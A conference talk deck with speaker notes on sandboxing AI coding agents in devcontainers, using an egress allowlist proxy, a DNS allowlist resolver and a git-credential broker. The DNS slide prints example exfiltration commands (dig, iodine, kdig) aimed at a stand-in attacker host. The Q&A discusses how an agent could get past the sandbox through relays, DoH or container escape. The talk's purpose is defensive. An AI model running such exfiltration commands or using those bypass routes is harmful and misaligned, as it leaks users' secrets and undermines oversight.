Conference Talk

Sandboxing Your
AI Coding Assistant

Keeping the developer workflow.
Losing the broad network access.

Sachit Vithaldas
Open with the core tension: agentic coding tools are extremely useful, but they run with your credentials, your network access, and your keys. This talk is about how to preserve the ergonomics while tightening the trust model. We'll start with devcontainers as the foundation, then show how to layer security controls on top — egress filtering, DNS controls, and credential isolation. --- POTENTIAL Q&A --- Q1: You say "keep the workflow, lose broad network access" — how do you prove you actually reduced risk instead of just moving it around? A1: I measure reduction by enumerating concrete exfil and credential-abuse paths that are present in a normal devcontainer and showing they are either removed or sharply narrowed here: outbound destinations are allowlisted, DNS is allowlisted, and Git write credentials never enter the workspace. Then I validate with negative tests: attempts to reach non-allowlisted hosts, DNS tunneling patterns, DoT/DoH, direct git push, and QUIC all fail. The remaining risk is explicit: whatever is still allowlisted can still be used as a relay, and container escapes are out of scope. Q2: What's the threat model — are you defending against a malicious model, prompt injection, a compromised dependency, or an insider? A2: The primary threat is "untrusted automation operating inside a developer-grade environment": a model that makes mistakes, is manipulated by prompt injection, or is steered by untrusted external content. The controls aim to make common high-impact failures harder: exfiltration to arbitrary endpoints, covert DNS channels, and uncontrolled Git writes. This is not a defense against a hostile insider with host access, kernel exploits, or a determined attacker exploiting a container escape; those require stronger isolation like VMs/gVisor and host hardening. Q3: If the sandbox breaks, do you fail open (agent regains internet) or fail closed (work stops)? What's the incident response story? A3: The intent is fail closed: if the egress chokepoint or DNS enforcement isn't present, outbound shouldn't silently revert to "full internet." Operationally, the "shared network namespace" pattern can produce confusing failure modes, so part of incident response is recognizing "stale namespace" symptoms quickly and recreating the stack rather than troubleshooting ad hoc. For IR, you want artifacts: proxy logs, DNS query logs, and broker logs for Git operations.
I

Devcontainers

The foundation everything else builds on.

Section one. We'll spend time here because understanding what devcontainers give you — and don't give you — is the whole setup for why the sandbox exists.

What is a Devcontainer?

A containerized development environment described as code.

The spec

A .devcontainer/devcontainer.json file describes the entire environment: base image, tools, extensions, port forwarding, and lifecycle hooks.

The experience

Your editor connects into the container. Code lives in a bind mount. Everyone who opens the repo gets the same baseline environment.

  • The container runs on your machine or in a cloud environment
  • Tools, runtimes, and extensions are all pinned in the config
  • The spec lives in the repo — reviewable, versioned, diffable
Ground this early. A devcontainer is not just a Dockerfile. It's the combination of container image, runtime config, editor integration, workspace mount, and lifecycle automation. The important framing: it makes development environments reproducible in a way that still feels like local development. --- POTENTIAL Q&A --- Q1: A devcontainer is still sharing the host kernel and bind-mounting the repo — why should I treat it as any kind of security boundary? A1: You shouldn't treat a vanilla devcontainer as a security boundary; it's primarily a reproducibility and ergonomics tool. The sandbox approach assumes that and adds controls that are meaningful even without VM-grade isolation: it reduces outbound connectivity and removes direct access to high-leverage credentials. The bind mount means the agent can still read your source tree, so the sandbox isn't about hiding code from the agent; it's about preventing the agent from freely exporting it or abusing credentials. Q2: What prevents the agent from reading secrets that are already in the repo or in the bind mount? A2: The first line of defense is operational hygiene: don't put real secrets in the repo, don't mount ~/.ssh, don't forward an SSH agent, and don't pass cloud creds into the container. The sandbox design enforces that by construction: credentials live outside the workspace, and the Git credential is moved into a broker container. If a secret is in the bind-mounted workspace, the agent can read it — the sandbox can't undo that, and that's called out as a limitation. Q3: What about supply-chain attacks where the agent installs something malicious inside the container and it persists across sessions? A3: That's a real risk: reproducibility doesn't equal integrity. Mitigations are "boring" but effective: pin base images and tool versions, minimize what you allow to be installed at runtime, and treat lockfiles as security-critical. The network allowlist also helps: even if something malicious runs, it has fewer places it can call out to. But if you allow common registries, you're still exposed to malicious packages.

Walk through the key fields. The split between image (single container) and dockerComposeFile+service (multi-service) is important — the latter is what this project uses. initializeCommand runs on the host before the build/start — that's where host-side secrets setup and stale container cleanup happen. containerEnv injects environment into the workspace without the agent needing to know the real credentials. --- POTENTIAL Q&A --- Q1: initializeCommand runs on the host — isn't that a giant footgun? If the repo is compromised, you just gave it host code execution. A1: Yes, and that's an uncomfortable truth: lifecycle hooks are powerful and can be dangerous. The safe posture is to treat devcontainer config as code that needs the same review standards as build scripts, because it effectively is. In my setup, initializeCommand is intentionally narrow: it sets up brokered credentials and avoids copying secrets into the container, but it still must be reviewed. Q2: You say "containerEnv injects env without the agent knowing real creds" — how do you ensure the agent can't just print env vars? A2: If you put real secrets into environment variables inside the workspace container, the agent can read them. The design here is to avoid that by keeping sensitive credentials out of the workspace entirely: network access is brokered through local proxies, and Git writes go through a broker container with a mounted key. The "agent doesn't know creds" claim only holds if the workspace never receives those creds. Q3: How do you prevent a malicious change to devcontainer.json or docker-compose.yml from quietly expanding access? A3: You prevent it with process and guardrails: code review on infra files, CI checks that diff for risky fields (socket mounts, privileged mode, host networking, new forwarded ports), and a principle of minimal surfaces in the compose file. You treat these files as "security policy," not "developer convenience," and require higher scrutiny.

How VS Code Actually Runs Them

Repo contains
.devcontainer/
→
Dev Container CLI builds & starts services via Docker Compose
→
Workspace folder is bind-mounted into the target container
→
VS Code server installs and attaches inside that container
Common misconception: VS Code is not running inside Docker. It orchestrates Docker from the host, then attaches its remote server into one chosen container.
This is the mechanical model people often miss. The VS Code process on your host talks to a lightweight server that gets installed inside the container. Your editor feels local, but all language servers, terminals, and tools run inside the container. The distinction matters: the host is still responsible for building images and managing the container lifecycle. --- POTENTIAL Q&A --- Q1: VS Code extensions run on the host and in the container — doesn't that blow up your trust model? A1: Correct: the sandbox constrains the containerized toolchain, not the host editor process. If your security goal includes preventing host exfiltration, you need host-level controls: extension allowlists, enterprise policies, and ideally running the editor itself in a controlled environment. Q2: The VS Code server is a networked component inside the container — can the agent attack it for privilege escalation? A2: It's part of the attack surface, yes. The VS Code server runs as the container user and should not have extra host privileges; the main boundary is still the container runtime. If you're worried about targeted exploitation, you'd reduce moving parts: fewer extensions, minimal server features. Q3: Port forwarding: can an agent expose internal services or leak data through forwarded ports? A3: Port forwarding is another footgun if misused. The safe pattern is to forward only what you need and assume anything forwarded is reachable by the host environment. Outbound network is still constrained, but forwarded ports can create unexpected inbound paths.

Docker Compose + Devcontainers

Multi-service setups let the devcontainer be one service among many.

dockerComposeFile

Points to your Compose file. VS Code uses it to build and orchestrate all services together.

service

The one container VS Code attaches into — your primary workspace. Other containers are helpers.

runServices

Additional services to start alongside the workspace — databases, proxies, MCP servers.

  • initializeCommand runs on the host before anything starts — ideal for secrets setup
  • forwardPorts exposes selected container ports back to your machine
  • shutdownAction: "stopCompose" tears down all services when you close VS Code
The Docker Compose pattern is powerful because it lets you compose a full environment — not just a workspace container, but databases, proxies, and services the workspace depends on. All managed as one unit, brought up and torn down together. This is the pattern this project uses extensively. --- POTENTIAL Q&A --- Q1: Compose lets anyone add a sidecar with full egress or a tunnel — what stops a contributor from adding a container that bypasses mitmproxy? A1: Nothing magical stops a malicious change if you run unreviewed compose files. The control is structural: all services that matter share the mitmproxy network namespace. But compose is still configuration-as-code; a changed compose file could introduce a new network mode. So you rely on review, policy checks, and treating compose changes like security changes. Q2: "internal: true" networks don't prevent egress; they only prevent external connectivity to that network. Why is that sufficient? A2: By itself, it's not sufficient; it's just hygiene. The real enforcement is iptables rules in the shared namespace that redirect/deny traffic and the allowlist in the proxy. The internal network setting helps prevent accidental exposure but the security claim depends on the chokepoint and firewall rules. Q3: Multi-service means more dependencies — aren't you increasing the attack surface compared to a single container? A3: Yes, you're trading "fewer components" for "components with explicit control points." A single container with full egress and mounted creds is simpler but has a huge blast radius. Adding a proxy, DNS resolver, and broker adds moving parts, but each one exists to shrink and audit a high-risk capability.

Why Teams Use Devcontainers

The real wins

  • Consistent onboarding — one command to get a working environment
  • Version-pinned tools — no more "which Node are you on?"
  • The environment is in the repo — reviewable and diffable
  • Isolated from host clutter — global state doesn't bleed in
  • Works the same in CI, GitHub Codespaces, and locally

The tradeoffs

  • Startup and rebuild cost — cold starts are slow
  • Docker complexity leaks through
  • Volume and filesystem edge cases
  • Networking can be surprising
  • Isolation is easy to overestimate
Present this as a tradeoff, not a sales pitch. The upside is real — standardization and convenience. The downside is that you inherit container lifecycle issues, volume semantics, permissions, and networking weirdness. And "containerized" does not automatically mean "secure enough for untrusted automation." --- POTENTIAL Q&A --- Q1: You claim "works in CI" — are you expecting CI to run agentic tools? If so, how do you prevent the agent from accessing CI secrets? A1: CI is often where secrets are richest, so running an autonomous agent there is high risk. The principle is the same: keep secrets out of the agent workspace and broker sensitive operations. The safe stance is: don't run untrusted autonomous agents in privileged CI contexts unless you've redesigned secret injection and scoped tokens down drastically. Q2: Compliance angle: what evidence can you provide that policy is enforced and not just "best effort"? A2: You can provide reproducible configuration (versioned devcontainer/compose, baked allowlist), plus runtime logs from enforcement points: proxy logs, DNS logs, and broker operation logs. You can also provide test cases that demonstrate blocked behavior. Full compliance posture depends on how you retain and protect those logs. Q3: Are you over-selling "isolated from host"? Devcontainers often mount the whole repo and sometimes home directories. A3: I explicitly try not to over-sell it. Devcontainers are great for tooling isolation, not for protecting the host from a determined adversary. The sandbox reduces what the agent can do over the network and removes direct access to some credentials, but it does not make the container "safe to run arbitrary hostile code."

What Devcontainers Don't Give You

Containerized ≠ sandboxed.

Default devcontainer behavior

  • Full outbound network access from inside the container
  • SSH agent forwarding if configured
  • Host-mounted credential files
  • Docker socket access if you need to build images
  • Whatever environment variables you inject

What you don't get automatically

  • Egress filtering
  • DNS controls
  • Credential isolation
  • Audit logging of outbound calls
  • Any network policy enforcement
This is the pivot slide. A normal devcontainer is a great developer tool. But for running an autonomous agent inside it, you're handing the agent your full dev environment. That's fine when the "agent" is you, a human. It's a problem when it's an LLM making decisions autonomously. --- POTENTIAL Q&A --- Q1: You list "SSH agent forwarding" and "Docker socket" as defaults — do you block both, and how do you verify they're not present? A1: The sandbox design avoids both: no SSH agent forwarding, no ~/.ssh mount, and no Docker socket mount. Verification is mechanical: inspect the compose config and container mounts, and inside the workspace check that SSH_AUTH_SOCK isn't set and /var/run/docker.sock isn't present. This is assertable in a startup script or CI policy check. Q2: Without audit logging and policy enforcement baked into the platform, aren't you building a one-off that's easy to misconfigure? A2: That's a fair critique. The mitigation is to keep the policy surface small and explicit: one egress enforcement point, one DNS resolver, one Git broker, and baked policy in images so runtime drift is harder. It's still possible to misconfigure, so you need automated checks and negative tests. Q3: What about non-obvious exfil channels besides DNS — NTP, ICMP, SMTP, raw TCP to random ports? A3: The intent is to block outbound broadly and only allow what's necessary. You deny UDP 80/443 to kill QUIC, and restrict other outbound ports. The real constraint is that Docker and the host networking stack still exist; you scope to 80/443 via the proxy plus explicit DNS, and treat "opening new outbound ports" as a security decision.
II

The Problem with Agentic Tools

Powerful by design. Unrestricted by default.

Section transition. We're shifting from "what devcontainers are" to "why they need extra controls for agentic use cases."

Agentic Coding Tools

Tools like OpenCode give an LLM access to your development environment — on purpose.

What they can do

  • Read and write files anywhere in the workspace
  • Run arbitrary shell commands
  • Make outbound HTTP requests
  • Perform Git operations
  • Call external APIs through MCP servers

Why the access is intentional

The whole point is autonomy. An agent that can't run commands, call APIs, or commit changes isn't useful.

The question isn't whether to grant access — it's which access, and how much.

Frame this charitably. The access is intentional — these tools need it to be useful. The question is whether the access should be completely unrestricted or whether meaningful controls can coexist with usefulness. --- POTENTIAL Q&A --- Q1: If the agent can run shell commands, why isn't this game over? It can just encode secrets into allowed requests or outputs. A1: Shell access means the agent can do anything the container user can do, so the question becomes "what can the container user reach and with what credentials?" The sandbox doesn't try to stop computation; it tries to reduce external communication paths and remove direct access to high-leverage credentials. It's about blast radius and observability. Q2: MCP tools expand capabilities — how do you prevent an MCP server from becoming a covert exfil gateway? A2: You treat MCP servers as part of the trusted computing base and run only local MCP endpoints you control. Those endpoints should have their own outbound restrictions and minimal tool surfaces. If you connect to arbitrary remote MCP servers, you've reintroduced the "call any external service" threat. Q3: How do you defend against prompt injection from allowed content sources steering the agent into bad actions? A3: Network controls don't solve prompt injection; they just limit where injected instructions can be fetched from and where results can be sent. The practical defenses are layered: constrain tools (brokered Git writes), keep credentials out of reach, and design workflows where risky actions require explicit user intent.

The Trust Problem

When the agent runs in your devcontainer, it inherits everything you gave that container.

Data exfiltration via DNS
Encode secrets as subdomain labels. Send small UDP queries. Bypasses HTTP allowlists entirely — DNS is not HTTP.
Calling arbitrary external services
Contact any endpoint: receive instructions, exfiltrate context, or phone home. No restriction by default.
Git credential abuse
Push to any branch the deploy key allows. Force-push. Rewrite history. The key in the workspace is the key.
Secret leakage
Read .env files, SSH keys, cloud credentials — anything mounted or forwarded into the container.
This is the threat model slide. The risk isn't necessarily a malicious model. It's also prompt injection from external content the model reads, model errors, or simply overly broad access that an accident can exploit. The blast radius of a mistake is determined by how much access the agent has. --- POTENTIAL Q&A --- Q1: DNS is one channel, but data can be exfiltrated in HTTPS to allowed hosts via query strings, headers, or even timing. Isn't allowlisting security theater? A1: Allowlisting is not a complete exfiltration defense; it's a reduction of attack surface. If you allow a destination that can accept arbitrary data, the agent can potentially smuggle data there. The value is that you've narrowed the set of destinations from "the entire internet" to "a small list you can review and monitor." It becomes a manageable governance problem instead of an unbounded one. Q2: If I'm a red teamer, I'll use an allowlisted endpoint as a relay. How do you stop that? A2: You stop it by being strict about what's allowlisted and what methods are allowed. Allowing "read-only metadata" (GET) is different from allowing arbitrary writes (POST/PUT). The git-broker is an example: it allows a narrow, audited write action rather than granting generic GitHub API access. For registries, the agent generally only needs to download packages; it shouldn't need to publish. Q3: Secret leakage: what if the model reads secrets from the repo and leaks them into the LLM request itself? Then your "egress control" is just funneling exfil through the model provider. A3: That's a real uncomfortable risk, and it's why I emphasize "keep secrets out of the workspace" as a prerequisite. If a secret is present in the files the agent can read, it can end up in prompts, logs, or model traffic even if every network request is allowlisted. The mitigation is operational: don't put secrets in the workspace, and use provider-side controls where possible.

The Design Goal

The agent should be able to work, but it should not be able to talk to arbitrary external services or receive broad Git credentials by default.

Keep

  • Normal devcontainer and editor workflow
  • Local model and MCP endpoints
  • Reproducible, version-pinned environment
  • Functional Git operations

Constrain

  • Outbound network — allowlist only
  • DNS resolution — allowlist only
  • Git push credentials — broker only
  • Raw secret access from inside the workspace
The thesis of the whole project. It's not anti-devcontainer. It's pro-devcontainer, but with sharper boundaries for autonomous tools. The design target is practical containment: usable enough for real work, but not equivalent to dropping the agent into your full host environment. --- POTENTIAL Q&A --- Q1: Who owns the allowlist and how do you prevent "allowlist creep" from turning it into "basically the internet" over time? A1: The only sustainable answer is governance: treat the allowlist as code with owners, review requirements, and a bias toward the smallest set that supports real workflows. You also want visibility into usage: proxy logs showing what was blocked and what was used can justify or refute new allowlist requests. Q2: You say "functional Git" but "no broad Git credentials" — what's the policy for branch creation, tags, force push, and pushing to forks? A2: The secure default is to allow the minimal set of Git operations the workflow truly needs and deny the rest by policy in the broker. Typically: fetch from origin, push the current HEAD to a constrained set of branches, and explicitly disallow force-push and history rewriting. Fork pushes and arbitrary remotes are usually disallowed. Q3: What happens when developers need to access a new external API for legitimate work — do they just turn off the sandbox? A3: The goal is to avoid "turn it off" by making the policy change path clear and auditable: you add a narrowly scoped allowlist entry, rebuild, and move on. If the friction is too high, people will bypass it, so the system has to make legitimate exceptions straightforward while still reviewable.

Reusing devcontainers. Adding real controls.

Walk this as layers of control, not just a list of containers. The key insight is that all services share the mitmproxy network namespace, so local service traffic stays on loopback while all outbound traffic funnels through a single policy point. mitmproxy is the only container with real external egress. --- POTENTIAL Q&A --- Q1: Shared network namespace means every container can bind to localhost and talk to every other service. If the workspace is compromised, can it attack the proxy/DNS/broker over loopback? A1: Yes: loopback is not a security boundary; it's a connectivity convenience. The assumption is that the local services are part of the trusted computing base and should be built defensively: minimal endpoints, authentication where appropriate, and no "admin" interfaces exposed. Q2: If mitmproxy is the only egress path, how do you ensure there isn't another path via IPv6, raw sockets, or Docker's embedded DNS? A2: You enforce at the firewall layer, not just at the proxy. The design relies on iptables rules to redirect/deny traffic and force DNS through the allowlisted resolver. You also explicitly block QUIC/UDP on 443. Network policy correctness is subtle; you validate with tests that try IPv4/IPv6 and non-proxy-aware clients. Q3: If a developer adds a new service container that doesn't share the namespace, it could have full egress. How do you prevent that structurally? A3: In Docker Compose, you can't prevent someone from changing the compose file if they control it. Prevention is procedural: review gates on compose changes, and automated checks that assert all services are network_mode: service:mitmproxy or otherwise restricted.

The Shared Network Namespace

One Docker trick. One policy choke point.


# docker-compose.yml
services:
  mitmproxy:
    networks: [ai_boundary, ai_egress]  # the ONLY service with real egress
    cap_add: [NET_ADMIN]                # needs iptables to set up redirect rules

  workspace:
    network_mode: "service:mitmproxy"  # shares mitmproxy's network namespace

  openrouter-proxy:
    network_mode: "service:mitmproxy"  # same — all traffic exits through mitmproxy

  git-broker:
    network_mode: "service:mitmproxy"  # same

networks:
  ai_boundary:
    internal: true  # no direct internet — must go through mitmproxy
  ai_egress: {}
  • Service-to-service traffic stays on 127.0.0.1 — no cross-container routing needed
  • All outbound traffic exits through mitmproxy's network interface
  • iptables rules inside the shared namespace enforce the policy
This is the core architectural move. By sharing the network namespace, you get a single choke point without needing sidecar injection or complex routing. The fragility: if mitmproxy restarts and the dependent containers don't, they're left holding a reference to a dead namespace. The initialize script handles this by detecting stale containers and tearing down before restart. --- POTENTIAL Q&A --- Q1: If mitmproxy restarts, do dependent containers fall back to default networking and regain unrestricted egress? A1: The dangerous failure mode would be "silently regain normal Docker networking," and the goal is to avoid that. With network_mode: service:mitmproxy, containers should either share the namespace or lose connectivity when the namespace is broken; they shouldn't automatically attach to a different network. You treat inconsistent reachability as a signal to recreate the full stack. Q2: Isn't this pattern basically a DIY service mesh without the safety properties? Why not use a real policy engine or CNI? A2: It's intentionally a minimal, local pattern optimized for "runs on a developer machine" without introducing a full orchestration layer. A real mesh/CNI/policy engine can give stronger guarantees but is heavier and often not compatible with a simple devcontainer workflow. Q3: Can the workspace container change iptables rules inside the shared namespace and disable enforcement? A3: If the workspace container has NET_ADMIN or runs privileged, then yes, it can sabotage enforcement. The sandbox assumes you do not grant those capabilities to the workspace. So part of the hard requirement is: don't run privileged containers, don't mount the host network stack, and keep capabilities minimal.

Egress Control: mitmproxy + Allowlist


# infra/mitmproxy/allow-list.yaml
openrouter.ai:           # all paths allowed

api.perplexity.ai:       # specific paths only
  - /chat/completions

github.com:              # deny-list mode
  - !/admin
  - !DELETE /repos/

"*.npmjs.com":           # wildcard subdomain

registry.npmjs.org:      # exact host

How it works

TCP 80 and 443 are transparently redirected to mitmproxy via iptables DNAT. The allowlist.py addon checks every request against the policy.

QUIC / HTTP3 blocked

UDP 80 and 443 are explicitly rejected — HTTP/3 can't bypass the proxy.

Policy is baked into the image at build time. Changing it requires a rebuild.
The allowlist supports exact hostnames, wildcard subdomains, path prefixes, method restrictions, and deny-list mode. Policy is baked into the mitmproxy image at build time — changing it requires a rebuild. That's intentional: it prevents runtime policy drift and makes changes visible in git history. --- POTENTIAL Q&A --- Q1: How do you prevent direct-IP access or SNI tricks from bypassing hostname allowlisting? A1: The allowlist decision should be made on the normalized destination host as observed at the policy point. If a client uses an IP literal, you can block it outright or only allow it when it maps to an allowed host. In practice, you deny direct-IP egress and require proper hostnames that match policy. Q2: TLS: are you doing MITM decryption, or just using mitmproxy as a forward proxy? If you're not decrypting, how do you enforce path/method rules? A2: Path/method enforcement implies either plaintext HTTP or TLS interception with installed trust roots, which has its own security and usability tradeoffs. If the talk claims path/method enforcement for arbitrary internet HTTPS, be ready to clarify exactly where it applies and what assumptions it requires. Q3: "Policy baked into the image" helps drift, but it also slows incident response. If you need to block a compromised domain now, do you really wait for rebuild? A3: That's a tradeoff: immutability vs agility. For a local dev sandbox, rebuilds are usually fast enough. If you need faster response, you'd layer an emergency deny mechanism, but that adds complexity. This project optimizes for reviewability and repeatability over hot patching.

DNS: The Exfiltration Channel

HTTP allowlists don't constrain DNS. DNS is not HTTP.

What DNS exfiltration looks like


# Encode secrets as subdomain labels
$ dig c2Vj...cGFzc3dvcmQ.attacker.io

# High-volume DNS tunneling
$ iodine -f attacker.io

# Encrypted DNS (DoT) on port 853
$ kdig @1.1.1.1 +tls secret.attacker.io

CoreDNS allowlist resolver

Generated from the same allow-list.yaml source of truth. If a host isn't in the HTTP allowlist, DNS lookups for it are refused.

iptables enforcement

UDP/TCP 53 DNAT'd to CoreDNS. Port 853 (DoT), 5353, and 8853 rejected. Non-loopback port 53 rejected. IPv6 output rejected.

DNS was added after the initial design because it's a classic covert channel that bypasses HTTP-level controls. The key insight: CoreDNS is generated at image build time from allow-list.yaml, so HTTP and DNS policy stay in sync from a single source of truth. The iptables rules ensure CoreDNS is the only process that can reach Docker's internal resolver directly — it inserts at position 1 of the OUTPUT chain to precede Docker's own DNAT rules. --- POTENTIAL Q&A --- Q1: DoH is just HTTPS to a dns-query endpoint. If you allow common endpoints (Cloudflare, Google), won't DNS exfil just move to DoH? A1: Yes: if you allow DoH endpoints, DNS controls can be bypassed because DNS becomes ordinary HTTPS traffic. The mitigation is to not allow DoH endpoints or restrict them so tightly they can't be used for arbitrary queries. That's why DNS allowlisting is paired with strict outbound allowlisting. Q2: Attackers can tunnel over other protocols (ICMP, NTP, SMTP) or use timing channels. Why focus on DNS? A2: Because DNS is the highest-leverage, lowest-friction covert channel in typical dev environments: it's ubiquitous, often unmonitored, and works even when HTTP is constrained. Blocking DNS removes an easy bypass. It doesn't claim to stop all covert channels; it closes one of the biggest holes. Q3: You mention iptables chain ordering. If that's wrong on some host, do you silently fall back to Docker's resolver and lose DNS control? A3: That's exactly the failure mode you should assume can happen. The mitigation is to treat DNS enforcement as testable behavior: on startup, query a non-allowlisted domain and ensure it fails, and query an allowlisted domain and ensure it succeeds. Without that validation, it's too easy to think you're protected when you aren't.

Git Credential Isolation

The workspace has no Git credentials. The git-broker does.

Not in the workspace

  • No personal access token
  • No deploy key
  • No SSH agent forwarding
    (SSH_AUTH_SOCK is blanked)
  • No ~/.ssh mount

The git-broker pattern

  • Separate container with a dedicated deploy key
  • Key mounted read-only from host, outside the repo
  • Exposes narrow MCP tools: fetch, push
  • Validates branch and origin before any operation
The agent calls git_broker.push() via MCP. It never holds the credential that makes the push possible.
This is a practical control, not a theoretical one. Authenticated Git access is high leverage — it can push bad code, rewrite history, or leak to any repo the key has access to. Separating the key from the workspace means the workspace can't directly abuse it. The broker validates branch and origin before allowing operations. Host-side scripts automate deploy key creation and revocation via the GitHub API. --- POTENTIAL Q&A --- Q1: If the agent can reach GitHub over HTTPS, it could still exfiltrate by opening issues, PR comments, or gists — even without Git credentials. Do you block GitHub writes at the network level? A1: GitHub is a powerful exfil and C2 surface. The safest stance is to avoid giving the workspace generic GitHub API write access and only permit specific Git operations via the broker. If you allow GitHub web/API traffic, restrict methods to read-only (GET) and narrow paths. Q2: How does the broker prevent abuse like pushing to a different repo, pushing tags, or force-pushing? A2: The broker enforces policy server-side: it knows which origin is allowed, which refs are allowed, and what operations are permitted. It should validate remote URL, restrict allowed refspecs, and explicitly deny force pushes and tag pushes. The enforcement point is the broker, not the agent. Q3: What if the broker itself is compromised? It holds the deploy key — isn't it your single point of catastrophic failure? A3: It is a high-value component. The benefit is that it's a small, auditable component with a very narrow API surface compared to "give the workspace a PAT." You mitigate by keeping the broker minimal, running it without extra privileges, mounting the key read-only, and limiting what that key can do. But yes: if the broker is popped, the attacker can act as that key.

Make it concrete. The sandbox is opinionated but not unusable. Common developer workflows — installing packages, fetching code, calling allowlisted APIs — all work. The things that shouldn't work don't: arbitrary outbound, DNS tunneling, raw git credentials. That's the goal. --- POTENTIAL Q&A --- Q1: You allow package installs (npm/pip/cargo/go). A malicious dependency can exfiltrate to any allowlisted host. Isn't that the dominant risk in practice? A1: Supply chain is absolutely a dominant risk, and this sandbox doesn't eliminate it. What it does is reduce where a compromised dependency can call out to and reduce access to credentials it could steal. To address supply chain more directly, you'd need lockfiles, pinned registries, checksums, auditing, and possibly a private mirror. Q2: You allow "OpenRouter via proxy" and "Perplexity MCP" — aren't those perfect exfiltration relays? A2: If secrets are in the workspace, the agent can potentially send them to any allowed LLM endpoint, yes. That's why the design pairs network controls with credential isolation and a strong recommendation to keep secrets out of the workspace. The control is "only allow the minimum model endpoints you choose." Q3: You say arbitrary HTTP gets a 403 — what stops an attacker from using allowed hosts with arbitrary paths? A3: Nothing stops that if you allow broad hosts and broad paths; that's a classic allowlist pitfall. The mitigation is to keep allowlist entries narrow: constrain hostnames, paths, and methods. Where you can't constrain paths, treat those destinations as higher risk and monitor them. This is why logging matters.

Honest Tradeoffs

This is practical containment, not VM-grade isolation.

What this doesn't protect against

  • An allowlisted endpoint becoming a relay for exfiltration
  • DNS-over-HTTPS if a DoH resolver ever enters the allowlist
  • Shared-namespace fragility after partial container rebuilds
  • Kernel exploits or container escapes

What requires ongoing hygiene

  • Allowlist creep — every new service widens the surface
  • Policy changes require image rebuilds — easy to skip
  • Credentials must stay outside the repo, not inside it
  • Reviewing what you add to runServices
This slide is important for credibility. The project doesn't claim perfect containment. It claims meaningful controls layered on top of a familiar workflow. The limits are real and should be understood before trusting the sandbox for sensitive work. In particular: if you widen allowlists carelessly or mount credentials into the workspace, the boundary weakens quickly. --- POTENTIAL Q&A --- Q1: Why not just run the agent in a VM, gVisor, or Firecracker and avoid all this container-network trickery? A1: Stronger isolation is a valid choice, especially for high-risk environments. The reason to start with devcontainers is workflow compatibility: developers already use them, the tooling is mature, and the friction is low enough that people actually adopt it. If your threat model includes container escapes, you should choose stronger isolation. Q2: Kernel exploits and container escapes are "out of scope," but that's exactly what a red team would try. Isn't that a fatal gap? A2: It's a gap, and calling it out is important. The sandbox reduces common, high-probability failure modes for agentic tools without requiring a new platform. If you're defending against a determined adversary who can exploit the kernel, you need VM isolation, patched hosts, and possibly dedicated hardware. The claim is not "safe against container escapes," it's "substantially safer than a default devcontainer." Q3: Allowlist governance: if policy changes require rebuilds, how do you manage urgent blocks, policy review, and auditability at scale? A3: At scale, treat policy as code with owners and CI checks, and keep a fast path for emergency denies. Rebuild requirements can be an advantage for auditability because the running policy maps to an image digest. The pragmatic approach: keep the default policy tight, make exceptions deliberate, and automate rebuild/recreate.

Takeaways

  • Devcontainers are excellent for environment consistency — but containerized ≠ sandboxed
  • Agentic tools need a tighter trust model: egress, DNS, and credentials are the three surfaces that matter
  • The shared network namespace trick gives you a single policy choke point without complex routing
  • HTTP allowlists alone leave DNS open — close it with a resolver built from the same source of truth
  • Credential isolation via a narrow broker keeps the agent functional without holding raw keys
  • Practical containment beats theoretical perfection — these controls are composable and incrementally adoptable
Sachit Vithaldas Questions?
Close on the framing: keep the ergonomics, tighten the trust model. These controls are composable — you can start with just the mitmproxy boundary and add DNS controls and Git isolation incrementally. The shared network namespace trick and the git-broker pattern are the two most reusable ideas from this project. Invite questions on tradeoffs, implementation details, and where this still falls short. --- POTENTIAL Q&A --- Q1: If a serious incident happens (suspected exfil or unauthorized push), what's the concrete playbook? A1: First, stop the environment and preserve logs from enforcement points: proxy access logs, DNS logs, and broker logs. Second, rotate anything plausibly exposed: model/provider keys, deploy keys, and any host credentials that were mounted. Third, review logs for unusual destinations, request patterns, and unexpected Git operations. Finally, fix the root cause: tighten allowlists, remove accidental secret mounts, and strengthen startup self-checks. Q2: How would you adapt this for a regulated environment (SOC 2/ISO)? A2: Map controls to artifacts: versioned policy files, image build provenance, automated tests demonstrating blocked behavior, and retained logs. Change management becomes "PRs to policy/config with required approvals" plus CI gates preventing risky config deltas. Document the threat model and explicitly list what's out of scope so auditors don't assume stronger guarantees than you provide. Q3: Uncomfortable question: if the agent can still talk to any allowlisted service, isn't the real control just "trust the allowlist," and won't it eventually include everything developers want? A3: The real control is exactly that: you're converting an unbounded problem into a bounded one you can govern. If you let the allowlist grow without discipline, you end up back at "full internet." So the long-term success criterion isn't the initial architecture; it's whether the organization can maintain a tight allowlist, keep secrets out of the workspace, and use brokers for high-leverage actions.
